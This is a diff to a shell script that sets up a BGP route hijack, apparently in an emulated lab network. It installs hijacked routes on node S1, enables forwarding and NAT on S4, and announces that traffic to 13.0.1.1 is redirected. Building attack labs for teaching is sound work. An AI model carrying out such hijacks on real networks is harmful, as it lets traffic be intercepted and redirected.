@@ -16,6 +16,11 @@ echo "Waiting 10 seconds for BGP convergence..."
 sleep 10
 
 echo ""
+echo "Installing S4's hijacked routes into S1's kernel..."
+# Extract routes from S4's BGP and install them on S1 pointing to S4 as nexthop
+python3 install_bgp_routes.py S1
+
+echo ""
 echo "Setting up traffic redirection on S4..."
 # Enable IP forwarding
 sudo python3 run.py --node S4 --cmd "sysctl -w net.ipv4.ip_forward=1 > /dev/null 2>&1"
@@ -28,7 +33,8 @@ sudo python3 run.py --node S4 --cmd "iptables -t nat -A POSTROUTING -s 14.0.1.0/
 echo ""
 echo "=========================================="
 echo "ATTACK ACTIVE!"
-echo "S4 is now hijacking 13.0.1.0/24 traffic"
+echo "S4 is now hijacking 13.0.x.x traffic"
 echo "Requests to 13.0.1.1 redirected to 14.0.1.1"
 echo "=========================================="
+
 
